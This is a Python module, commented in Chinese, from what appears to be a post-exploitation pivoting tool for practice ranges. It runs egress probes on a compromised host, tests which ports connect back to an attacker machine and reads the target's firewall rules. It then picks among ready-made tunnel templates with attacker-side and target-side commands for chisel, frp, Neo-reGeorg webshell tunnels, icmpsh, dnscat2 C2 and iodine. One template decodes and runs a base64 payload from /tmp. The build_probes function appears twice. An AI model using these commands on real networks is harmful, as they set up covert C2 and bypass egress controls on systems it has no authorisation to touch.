"""出网探测（M2 出网探测）：经会话层真实执行 ICMP / DNS / HTTP / TCP 四类探针。

设计要点：
- 全部经 SessionBase.exec 在目标侧真实执行，解析真实回显（路由层零 subprocess）；
- 返回结构对齐前端 proxy.js 的 detect 状态：verdict / recommend / alt / reason + 逐探针；
- 结论不伪造：探针失败如实标注，并给出降级建议（正向连接 / 复用上层代理）。
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from ..session.base import SessionBase

#: 默认探测目标（可在请求里覆盖）
#:
#: ⚠️ 设计修正：原先固定探 8.8.8.8 / www.baidu.com，回答的是"能不能上公网"，
#: 而真实靶场关心的是"能不能回连到**攻击机**的某个端口"。公网目标仅作兜底，
#: 有攻击机地址时优先以攻击机为对端（见 `probe_callback_matrix`）。
DEFAULTS = {
    "icmpHost": "8.8.8.8",
    "dnsName": "www.baidu.com",
    "httpUrl": "http://www.baidu.com/",
    "tcpHost": "www.baidu.com",
    "tcpPort": 443,
}

#: 回连端口矩阵默认探测集（覆盖常见反弹/隧道/C2 端口）
CALLBACK_PORTS = [21, 22, 25, 53, 80, 443, 4444, 5000, 8000, 8080, 8443, 1080, 1331, 1389, 9001]

#: 隧道模板库：按"能出什么"给可执行编排，而不是只报一句结论。
TUNNEL_TEMPLATES = [
    {
        "id": "chisel-reverse",
        "name": "chisel（反向，单文件）",
        "transport": "TCP（任意高位端口）",
        "condition": "目标可出站到攻击机任意 TCP 端口",
        "attackerCmd": "./chisel server -p 1331 --reverse",
        "targetCmd": "./chisel client {attackIp}:1331 R:0.0.0.0:1080:socks",
        "note": "单文件易上传，一个端口搞定 socks。出站受限时把 1331 换成白名单允许的端口。",
    },
    {
        "id": "frp-reverse",
        "name": "frp（反向 SOCKS5，链路更稳）",
        "transport": "TCP",
        "condition": "目标可出站到攻击机任意 TCP 端口；需要多级级联/长期稳定",
        "attackerCmd": "./frps -p 7000",
        "targetCmd": "./frpc -c frpc.ini   # [socks] type=tcp remote_port=1080 plugin=socks5",
        "note": "多级穿透首选；每层 frpc 各配一条，攻击机侧把 remote_port 当 SOCKS 入口。",
    },
    {
        "id": "neoreg-http",
        "name": "Neo-reGeorg（HTTP 正向隧道）",
        "transport": "HTTP（80/443，复用已登记 Webshell）",
        "condition": "**出站被白名单锁死，仅 80/443 可达**；已有 WebShell 落地能力",
        "attackerCmd": "python neoreg.py -k <key> -u http://<target>/tunnel.php -p 1080",
        "targetCmd": "（把 neoreg 生成的 tunnel.php 用 WebShell 写入 web 根目录）",
        "note": "tier-2「封锁边界」类题的正解：不依赖目标主动出站，全部流量伪装成 Web 请求。",
    },
    {
        "id": "icmpsh",
        "name": "icmpsh（ICMP 隧道）",
        "transport": "ICMP",
        "condition": "TCP 全封但 ICMP 放行",
        "attackerCmd": "sysctl -w net.ipv4.icmp_echo_ignore_all=1 && python3 icmpsh-m.py <attackIp> <targetIp>",
        "targetCmd": "echo <b64> | base64 -d > /tmp/t; chmod +x /tmp/t; /tmp/t {attackIp}",
        "note": "注意攻击机要先关闭自身 ICMP 应答，否则 icmpsh 收不到目标回包。",
    },
    {
        "id": "dnscat2",
        "name": "dnscat2（DNS 隧道）",
        "transport": "UDP/53",
        "condition": "TCP 全封但 UDP/53 放行（最常见的一类白名单）",
        "attackerCmd": "ruby dnscat2.rb --dns 'domain=example.com,host=<attackIp>'",
        "targetCmd": "./dnscat --dns server={attackIp}:53",
        "note": "加密 C2，抗审计较好；无授权域名时可用直连模式 server=<attackIp>:53。",
    },
    {
        "id": "iodine-dns",
        "name": "iodine（DNS 隧道，带 IP 层）",
        "transport": "UDP/53",
        "condition": "UDP/53 放行，且需要真正的 IP 隧道而非纯 C2",
        "attackerCmd": "iodined -f -c -P <pass> 10.66.66.1 t.example.com",
        "targetCmd": "iodine -f -P <pass> {attackIp} t.example.com",
        "note": "能跑通完整内网扫描（拿到 tun 网卡），比 dnscat2 更适合大规模测绘。",
    },
    {
        "id": "portfwd-forward",
        "name": "正向连接（靶机不可出网时的兜底）",
        "transport": "攻击机 → 靶机（入方向）",
        "condition": "四类出站全部失败，但靶机有对外可达端口（如 Web 80）",
        "attackerCmd": "（在攻击机侧编排：经已有 L1 代理向本段做正向转发）",
        "targetCmd": "无需目标侧动作：用已有 WebShell 承载请求/响应",
        "note": "出站全封时唯一剩下的路：把命令塞进 Web 请求，回显塞进响应体。",
    },
]


def templates_for(ok_icmp: bool = False, ok_dns: bool = False, ok_tcp: bool = False,
                  ok_http: bool = False) -> list[dict]:
    """按探针证据筛选可用隧道模板（证据驱动的推荐，不做无条件推荐）。"""
    ids: list[str] = []
    if ok_tcp:
        ids += ["chisel-reverse", "frp-reverse"]
    if ok_http:
        ids.append("neoreg-http")
    if ok_icmp:
        ids.append("icmpsh")
    if ok_dns:
        ids += ["dnscat2", "iodine-dns"]
    if not ids:
        ids.append("portfwd-forward")
    by_id = {t["id"]: t for t in TUNNEL_TEMPLATES}
    return [dict(by_id[i]) for i in ids if i in by_id]


@dataclass
class ProbeItem:
    key: str
    state: str = "idle"      # idle | run | ok | fail
    progress: int = 0
    ms: int = 0
    expect: str = "ok"
    cmd: str = ""
    evidence: str = ""

    def to_dict(self) -> dict:
        return {"key": self.key, "state": self.state, "progress": self.progress,
                "ms": self.ms, "expect": self.expect, "cmd": self.cmd,
                "evidence": self.evidence}


@dataclass
class ProbeReport:
    hostId: str = ""
    verdict: str = ""
    recommend: str = ""
    alt: str = ""
    reason: str = ""
    probes: list[ProbeItem] = field(default_factory=list)
    #: 证据驱动的隧道模板（含攻击机侧/目标侧可执行命令）
    templates: list[dict] = field(default_factory=list)
    #: 回连端口矩阵模式下可达的端口
    reachablePorts: list[int] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {"hostId": self.hostId, "verdict": self.verdict, "recommend": self.recommend,
                "alt": self.alt, "reason": self.reason,
                "probes": [p.to_dict() for p in self.probes],
                "templates": self.templates,
                "reachablePorts": self.reachablePorts}


def _cmd_icmp(host: str, platform: str) -> str:
    if platform == "windows":
        return f"ping -n 2 -w 2000 {host}"
    return f"ping -c 2 -W 2 {host} 2>&1"


def _cmd_dns(name: str, platform: str) -> str:
    if platform == "windows":
        return f"nslookup {name}"
    return f"(getent hosts {name} || nslookup {name} 2>&1 || host {name} 2>&1)"


def _cmd_http(url: str, platform: str) -> str:
    if platform == "windows":
        return ('powershell -NoP -NonI -Command "try{$r=Invoke-WebRequest -Uri ' + url
                + ' -UseBasicParsing -TimeoutSec 6; Write-Output (\\"HTTP \\" + $r.StatusCode)}'
                + 'catch{Write-Output \\"ERR $($_.Exception.Message)\\"}"')
    return (f"(curl -s -o /dev/null -m 6 -w 'HTTP %{{http_code}}' {url} 2>&1 || "
            f"wget -q -T 6 -O /dev/null --server-response {url} 2>&1 | head -n 3)")


def _cmd_tcp(host: str, port: int, platform: str) -> str:
    if platform == "windows":
        return ('powershell -NoP -NonI -Command "try{$c=New-Object Net.Sockets.TcpClient;'
                f'$c.Connect(\\"{host}\\",{port}); Write-Output \\"TCP OPEN\\"; $c.Close()}}'
                'catch{Write-Output \\"TCP CLOSED\\"}"')
    return (f"(timeout 5 bash -c 'exec 3<>/dev/tcp/{host}/{port} && echo TCP OPEN' 2>&1 "
            f"|| (echo > /dev/tcp/{host}/{port} 2>/dev/null && echo TCP OPEN) "
            f"|| echo TCP CLOSED)")


#: 目标侧 HTTP 失败的典型标记（命中任一即判 fail，不再靠"输出里没 err"猜成功）
_HTTP_FAIL_MARKS = (
    "couldn't connect", "failed to connect", "connection refused", "connection timed out",
    "timed out", "unable to resolve", "resolve host", "no route to host",
    "network is unreachable", "empty reply", "operation not permitted",
    "unable to connect", "connection reset", "certificate", "ssl",
)


def _parse(key: str, output: str) -> tuple[bool, str]:
    """解析真实回显 → (是否可达, 证据片段)。不猜：只认明确标记。"""
    text = (output or "").strip()
    low = text.lower()
    if key == "ICMP":
        ok = bool(re.search(r"(ttl=|时间[<=]|time[<=]\s*\d|bytes from|来自.*的回复)", low)) \
            and "unreachable" not in low and "无法访问" not in text
        return ok, _first_line(text)
    if key == "DNS":
        ok = bool(re.search(r"\b\d{1,3}(\.\d{1,3}){3}\b", text)) and "can't find" not in low \
            and "timed out" not in low and "not found" not in low and "找不到" not in text
        return ok, _first_line(text)
    if key == "HTTP":
        m = re.search(r"HTTP\s+(\d{3})", text)
        if m:
            return int(m.group(1)) < 500, text[:160]
        # 无状态行：必须明确无失败标记才算成功（修复：原先"输出里没有 err 就算 200"，
        # 导致 curl/wget 被防火墙 DROP 时的 "(28) Connection timed out" 被误判为 HTTP 可达）
        if any(mark in low for mark in _HTTP_FAIL_MARKS):
            return False, _first_line(text)
        if key.startswith("HTTP:"):
            return False, _first_line(text)
        return False, _first_line(text) or "无有效 HTTP 回显"
    if key == "TCP" or key.startswith("TCP:"):
        return ("tcp open" in low), text[:160]
    return bool(text), text[:160]


def _first_line(text: str) -> str:
    for line in (text or "").splitlines():
        line = line.strip()
        if line:
            return line[:160]
    return ""


def _compact_html(text: str, limit: int = 120) -> str:
    return re.sub(r"\s+", " ", re.sub(r"<[^>]*>", "", text or "")).strip()[:limit]


def build_probes(platform: str, opts: dict) -> list[ProbeItem]:
    o = {**DEFAULTS, **(opts or {})}
    return [
        ProbeItem(key="ICMP", expect="fail", cmd=_cmd_icmp(str(o["icmpHost"]), platform)),
        ProbeItem(key="DNS", expect="ok", cmd=_cmd_dns(str(o["dnsName"]), platform)),
        ProbeItem(key="HTTP", expect="ok", cmd=_cmd_http(str(o["httpUrl"]), platform)),
        ProbeItem(key="TCP", expect="ok", cmd=_cmd_tcp(str(o["tcpHost"]), int(o["tcpPort"]), platform)),
    ]


def conclude(items: list[ProbeItem]) -> tuple[str, str, str, str]:
    """四探针结果 → (verdict, recommend, alt, reason)。

    ⚠️ 修正：原先 `if ok["TCP"] or ok["HTTP"]` 把两者混同，HTTP 探针一旦假阳性
    就直接输出「可反向 TCP / HTTP 出网」并推荐 chisel。现在分档给出，且推荐必须
    与**证据**一致：仅 HTTP 通 → 推 HTTP 隧道（不是 chisel 反向）。
    """
    ok = {p.key: (p.state == "ok") for p in items}
    tcp, http, dns, icmp = ok.get("TCP"), ok.get("HTTP"), ok.get("DNS"), ok.get("ICMP")
    if tcp:
        return ("可反向 TCP 出网", "chisel（反向，单文件易上传）",
                "frp（反向 Socks5，链路更稳）",
                "目标可出站任意 TCP 端口：单跳用 chisel 一条命令搞定；需要长期稳定/多级链时换 frp。")
    if http:
        return ("仅 HTTP(S) 出网", "Neo-reGeorg（HTTP 隧道，复用已登记 Webshell）",
                "chisel over HTTP / 冰蝎·哥斯拉内置 HTTP 隧道",
                "TCP 直连被阻断但 HTTP 可达：用 Web 请求承载 SOCKS 流量，无需目标主动出站。")
    if dns and icmp:
        return ("仅 DNS + ICMP 出网", "dnscat2 / iodine（DNS 隧道）",
                "icmpsh（ICMP 隧道）",
                "TCP/HTTP 均被阻断，仅 UDP/53 与 ICMP 可用：走 DNS 或 ICMP 隧道建立 C2。")
    if dns:
        return ("仅 DNS 出网", "dnscat2 / iodine（DNS 隧道）", "",
                "TCP/HTTP 均被阻断，仅 UDP/53 可出：用 DNS 隧道（无授权域名时可用直连模式）。")
    if icmp:
        return ("仅 ICMP 出网", "icmpsh（ICMP 隧道）", "",
                "仅 ICMP 放行：用 icmpsh 等 ICMP 隧道；注意攻击机需先关闭自身 ICMP 应答。")
    return ("未发现可用出网通道", "考虑正向连接（靶机不可出网，由攻击端主动连入）",
            "或通过已有 L1 代理向本段做正向转发",
            "四类探测全部失败，建议改用正向隧道或复用上层已建立的代理。")


def _rules_cmd(platform: str) -> str:
    """读目标侧防火墙留档（各题常见 /opt/firewall.rules 与 iptables-save 位置）。"""
    if platform == "windows":
        return "netsh advfirewall show allprofiles 2>&1 | head -n 30"
    return ("(cat /opt/firewall.rules 2>/dev/null || iptables-save 2>/dev/null "
            "|| cat /etc/iptables/rules.v4 2>/dev/null || echo PIVOTHUB_NO_RULES)")


def _rules_hint(text: str) -> str:
    """从防火墙留档里提取放行项，给出「该把服务端挪到哪」的可执行提示。"""
    if not text or "PIVOTHUB_NO_RULES" in text:
        return ""
    allowed = []
    for line in text.splitlines():
        line = line.strip()
        if not line.startswith("-A ") or ".-j DROP" in line or line.endswith("DROP"):
            continue
        if "-j ACCEPT" not in line and "-j RETURN" not in line:
            continue
        if "-p icmp" in line:
            allowed.append("ICMP")
        m = re.search(r"--dport[s]?\s+([0-9,:]+)", line)
        if m:
            allowed.append(("UDP/" if "-p udp" in line else "TCP/") + m.group(1))
        m = re.search(r"-d\s+(\d+\.\d+\.\d+\.\d+/\d+)", line)
        if m and not m.group(1).endswith(".0.1/32"):
            allowed.append("→ " + m.group(1))
    if not allowed:
        return ""
    uniq = list(dict.fromkeys(allowed))
    return ("目标侧防火墙留档显示放行项：" + " / ".join(uniq[:8])
            + "。请把隧道服务端挪到上述端口，或改用对应协议的隧道（如仅 UDP/53 → DNS 隧道）。")


def build_probes(platform: str, opts: dict) -> list[ProbeItem]:
    o = {**DEFAULTS, **(opts or {})}
    return [
        ProbeItem(key="ICMP", expect="fail", cmd=_cmd_icmp(str(o["icmpHost"]), platform)),
        ProbeItem(key="DNS", expect="ok", cmd=_cmd_dns(str(o["dnsName"]), platform)),
        ProbeItem(key="HTTP", expect="ok", cmd=_cmd_http(str(o["httpUrl"]), platform)),
        ProbeItem(key="TCP", expect="ok", cmd=_cmd_tcp(str(o["tcpHost"]), int(o["tcpPort"]), platform)),
    ]


def run_probes(session: SessionBase, host_id: str = "", opts: dict | None = None,
               per_timeout: float = 12.0) -> ProbeReport:
    """真实执行四类探针并给出结论（失败如实记录证据）。"""
    platform = getattr(session, "platform", "linux")
    items = build_probes(platform, opts or {})
    for p in items:
        p.state = "run"
        res = session.exec(p.cmd, timeout=per_timeout)
        p.ms = int(getattr(res, "ms", 0) or 0)
        out = (res.output or "") + (("\n" + res.error) if getattr(res, "error", "") else "")
        ok, evidence = _parse(p.key, out)
        p.state = "ok" if ok else "fail"
        p.progress = 100
        p.evidence = _compact_html(evidence) or (res.error or "无回显")
    verdict, recommend, alt, reason = conclude(items)
    # 全失败或仅非常规通道时，再读一眼目标侧防火墙留档，把"该挪到哪个端口"讲清楚
    ok_map = {p.key: (p.state == "ok") for p in items}
    if not ok_map.get("TCP"):
        try:
            rr = session.exec(_rules_cmd(platform), timeout=per_timeout)
            hint = _rules_hint((rr.output or "") + "\n" + (rr.error or ""))
            if hint:
                reason = reason + " " + hint
        except Exception:  # pragma: no cover - 留档不可读不影响主结论
            pass
    templates = templates_for(ok_icmp=ok_map.get("ICMP", False), ok_dns=ok_map.get("DNS", False),
                              ok_tcp=ok_map.get("TCP", False), ok_http=ok_map.get("HTTP", False))
    return ProbeReport(hostId=host_id, verdict=verdict, recommend=recommend, alt=alt,
                       reason=reason, probes=items, templates=templates)


def run_callback_matrix(session: SessionBase, attack_ip: str, host_id: str = "",
                        ports: list[int] | None = None,
                        per_timeout: float = 8.0) -> ProbeReport:
    """【A4】对攻击机做端口矩阵探测：直接回答「哪个端口能回连」。

    与四探针的区别：四探针探的是"能不能上公网"，这里探的是**真正要用的那条回连路径**。
    逐个端口构造 TCP connect 探针，在目标侧执行，如实标注可达/不可达。
    """
    platform = getattr(session, "platform", "linux")
    plist = [int(p) for p in (ports or CALLBACK_PORTS)]
    if not attack_ip:
        return ProbeReport(hostId=host_id, verdict="攻击机地址未配置",
                           reason="请在「全局设置」里填写攻击机 IP，再做回连端口矩阵探测。")
    items: list[ProbeItem] = [
        ProbeItem(key="ICMP", expect="fail", cmd=_cmd_icmp(attack_ip, platform)),
    ]
    for port in plist:
        items.append(ProbeItem(key=f"TCP:{port}", expect="ok",
                               cmd=_cmd_tcp(attack_ip, port, platform)))
    for p in items:
        p.state = "run"
        res = session.exec(p.cmd, timeout=per_timeout)
        p.ms = int(getattr(res, "ms", 0) or 0)
        out = (res.output or "") + (("\n" + res.error) if getattr(res, "error", "") else "")
        ok, evidence = _parse(p.key, out)
        p.state = "ok" if ok else "fail"
        p.progress = 100
        p.evidence = _compact_html(evidence) or (res.error or "无回显")
    reachable = [int(p.key.split(":")[1]) for p in items
                 if p.key.startswith("TCP:") and p.state == "ok"]
    icmp_ok = any(p.key == "ICMP" and p.state == "ok" for p in items)
    if reachable:
        verdict = f"可回连攻击机 {attack_ip} 的端口：" + ",".join(str(x) for x in reachable)
        recommend = f"把隧道服务端监听在 {reachable[0]}（该端口已证实出站可达）"
        alt = f"备选端口：" + ",".join(str(x) for x in reachable[1:]) if len(reachable) > 1 else ""
        reason = ("逐端口实测结论：这些端口目标能主动连出。隧道服务端端口请直接选其中之一，"
                  "不必再试其它端口。")
    else:
        verdict = f"攻击机 {attack_ip} 无任何 TCP 端口可达"
        recommend = "改用 ICMP / DNS 隧道，或走「HTTP 正向隧道（Neo-reGeorg）」"
        alt = "icmpsh（ICMP）/ dnscat2（DNS）" if icmp_ok else ""
        reason = ("逐端口实测：目标无法向攻击机建立任何 TCP 连接 → 反向隧道不可行。"
                  + ("但 ICMP 可达，ICMP 隧道可用。" if icmp_ok else ""))
    templates = templates_for(ok_icmp=icmp_ok, ok_dns=False,
                              ok_tcp=bool(reachable), ok_http=bool({80, 443} & set(reachable)))
    return ProbeReport(hostId=host_id, verdict=verdict, recommend=recommend, alt=alt,
                       reason=reason, probes=items, templates=templates,
                       reachablePorts=reachable)
